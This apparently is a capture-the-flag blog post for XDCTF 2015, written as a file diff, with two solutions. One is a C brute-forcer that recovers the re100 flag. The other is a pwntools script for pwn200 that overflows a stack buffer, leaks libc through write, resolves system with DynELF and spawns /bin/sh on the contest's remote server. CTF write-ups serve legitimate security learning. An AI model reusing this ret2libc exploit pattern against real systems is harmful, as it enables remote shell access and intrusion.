@@ -1,0 +1,168 @@
+---
+layout: post
+title: "xdctf_re100&amp;pwn200"
+date: 2015-10-01 23:59:19 +0800
+comments: true
+categories: 
+---
+
+###0x00 re100
+
+	#include<stdio.h>
+	#include<stdlib.h>
+	#include<string.h>
+
+	//char *key = "\\\|Gq\\@?BelTtK5L`\\|D`d42;";
+	char *key = "\x5a\x7a\x41\x77\x5a\x46\x39\x44\x63\x6a\x52\x72\x4d\x33\x4a\x66\x5a\x7a\x42\x66\x62\x32\x34\x3d";
+	char *res = "\;%#848N!0Z?7'%23]/5#1\"YX";
+	char cipher[30];
+
+	char TMP[30];
+
+
+	int main()
+	{
+		int i,j, k;
+		int tmp;
+		char tmpc;
+		memset(cipher, 0, 30);
+		memset(TMP, 0, 30);
+		puts("key");
+		for(i=0; i<strlen(key); i++)
+		{
+			printf("%3x", key[i]);
+		}	 
+		puts("\nres");
+		for(i=0; i<strlen(key); i++)
+		{
+			printf("%3x", res[i]);
+		}	 
+		puts("");
+		
+
+		for(int l1=0; l1<2; l1++)
+		for(int l2=0; l2<2; l2++)
+		for(int l3=0; l3<2; l3++)
+		for(int l4=0; l4<2; l4++)
+		for(int l5=0; l5<2; l5++)
+		for(int l6=0; l6<2; l6++)
+		for(int l7=0; l7<2; l7++)
+		for(int l8=0; l8<2; l8++)
+		for(int l9=0; l9<2; l9++)
+		for(int l10=0; l10<2; l10++)
+		for(int l11=0; l11<2; l11++)
+		for(int l12=0; l12<2; l12++)
+		for(int l13=0; l13<2; l13++)
+		for(int l14=0; l14<2; l14++)
+		for(int l15=0; l15<2; l15++)
+		for(int l16=0; l16<2; l16++)
+		for(int l17=0; l17<2; l17++)
+		for(int l18=0; l18<2; l18++)
+		for(int l19=0; l19<2; l19++)
+		{
+			for(j = 0; j<25; j++)
+				TMP[j] = res[j];
+			TMP[0]	= l1==0?TMP[0]  - 0x20:TMP[0];
+			TMP[1]	= l2==0?TMP[1]  - 0x20:TMP[1];
+			TMP[2]	= l3==0?TMP[2]  - 0x20:TMP[2];
+			TMP[3]  = l4==0?TMP[3]  - 0x20:TMP[3];
+			TMP[4]  = l5==0?TMP[4]  - 0x20:TMP[4];
+			TMP[5]  = l6==0?TMP[5]  - 0x20:TMP[5];
+			TMP[7]	= l7==0?TMP[7]  - 0x20:TMP[7];
+			TMP[8]  = l8==0?TMP[8]  - 0x20:TMP[8];
+			TMP[10]	= l9==0?TMP[10] - 0x20:TMP[10];
+			TMP[11] = l10==0?TMP[11] - 0x20:TMP[11];
+			TMP[12] = l11==0?TMP[12] - 0x20:TMP[12];
+			TMP[13] = l12==0?TMP[13] - 0x20:TMP[13];
+			TMP[14] = l13==0?TMP[14] - 0x20:TMP[14];
+			TMP[15] = l14==0?TMP[15] - 0x20:TMP[15];
+			TMP[17] = l15==0?TMP[17] - 0x20:TMP[17];
+			TMP[18] = l16==0?TMP[18] - 0x20:TMP[18];
+			TMP[19] = l17==0?TMP[19] - 0x20:TMP[19];
+			TMP[20] = l18==0?TMP[20] - 0x20:TMP[20];
+			TMP[21] = l19==0?TMP[21] - 0x20:TMP[21];
+			for(i=0; i<12; i++)		//change
+			{
+				tmpc = TMP[i];
+				TMP[i] = TMP[17 - i];
+				TMP[17 - i] = tmpc;
+			}
+			for(i=0; i<24; i++)		//xor
+			{
+				//TMP[i] = TMP[i]^key[i]^7;
+				TMP[i] = TMP[i]^key[i];
+			}
+			if(0 == strncmp(TMP,&TMP[12],12))
+			{
+				int sig=1;
+				for(int ge=0; ge<12; ge++)
+					if(TMP[ge]<=0x61 )
+						sig = 0;
+				printf("%s\n", TMP);
+				TMP[12]=0;
+				printf("%s\n", TMP);
+			}
+		}              
+
+		
+	}
+
+###0x01 pwn200
+
+	from pwn import *
+	from binascii import *
+
+	func = 0x08048484
+	main = 0x080484BE
+	write_plt = 0x080483C0
+	read_plt = 0x08048390
+	read_got = 0x0804A004
+	#data_addr = 0x804A044
+	data_addr = 0x804A014
+
+
+
+	f = open('input', 'w')
+
+	#r = process("./c1")
+	r = remote('133.130.111.139', 2333)
+
+	def leak(addr):
+		print r.recvuntil("XDCTF2015~!")
+		payload  = ''
+		payload += "A"*0x6c
+		payload += "BBBB"
+		payload += p32(write_plt)
+		payload += p32(main)
+		payload += p32(1)
+		payload += p32(addr)
+		payload += p32(4)
+		r.sendline(payload)
+		data = r.recv(4)
+		data = r.recv(4)
+		print 'addr',hex(addr),'=>',hex(u32(data))
+		return data
+
+	def write_addr(addr, cont, system_addr):
+		print r.recvuntil("XDCTF2015~!")
+		payload  = ''
+		payload += "C"*0x6c
+		payload += "DDDD"
+		payload += p32(read_plt)
+		payload += p32(system_addr)
+		payload += p32(0)
+		payload += p32(addr)
+		payload += p32(len(cont))
+		payload = payload.ljust(0x100, 'E')
+		payload += cont
+		r.sendline(payload)
+		f.write(payload+'\n')
+
+	d = DynELF(leak, elf=ELF('./c1'))
+	system_addr = d.lookup('system','libc')
+	print "system_addr=" + hex(system_addr)
+	write_addr(data_addr, '/bin/sh', system_addr)
+
+
+	f.close()
+	r.interactive()
